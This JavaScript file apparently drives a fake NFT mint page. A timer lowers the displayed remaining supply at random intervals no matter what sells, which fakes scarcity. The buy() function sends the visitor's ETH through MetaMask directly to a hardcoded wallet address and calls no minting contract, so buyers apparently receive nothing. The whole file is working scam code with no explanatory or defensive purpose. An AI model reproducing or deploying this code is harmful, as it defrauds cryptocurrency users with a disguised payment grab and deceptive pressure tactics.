let input = document.querySelector('#count')
let total = document.querySelector('#total')
qty = 162
document.getElementById('qty').innerHTML = qty;

const price = 0.15
const max = 5
const address = '0xB1c6b0c14e954A02c51884041d08FA7AF63240e7'

document.querySelector('#price1').innerHTML = price
document.querySelector('#price2').innerHTML = price
document.querySelector('#total').innerHTML = price
document.querySelector('#max').innerHTML = max

function time() {
    mint = Math.ceil(5000);
    maxt = Math.floor(10000);
    return Math.floor(Math.random() * (maxt - mint + 1)) + mint; //Максимум и минимум включаются
}

setInterval(() => {
    document.getElementById('qty').innerHTML = qty;
    qty-=1
}, time());


document.querySelector('#plus').addEventListener('click', function() {
    let intvalue = parseInt(input.value)
    if (intvalue < max) {
        input.value = intvalue + 1
        total.innerHTML = ((intvalue + 1) * price).toFixed(2);
    }
})

document.querySelector('#minus').addEventListener('click', function() {
    let intvalue = parseInt(input.value)
    if (intvalue > 1) {
        input.value = intvalue - 1
        total.innerHTML = ((intvalue - 1) * price).toFixed(2);
    }
})
document.querySelector('#maxbtn').addEventListener('click', function() {
    input.value = max
    total.innerHTML = (max * price).toFixed(2);
})

async function buy() {
    totalint = parseFloat(total.innerHTML)
    if (typeof window.ethereum !== 'undefined') {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];
        cost = 2;
        //Sending Ethereum to an address
        ethereum
        
          .request({
            method: 'eth_sendTransaction',
            params: [
              {
                from : account,
                to: address,
                value: ethers.utils.parseEther(`${totalint}`)['_hex'],
              },
            ],
          })
          .then((txHash) => console.log(txHash))
          .catch((error) => console.error);
    } else {
        alert('Install Metamask wallet to mint!')
    }
}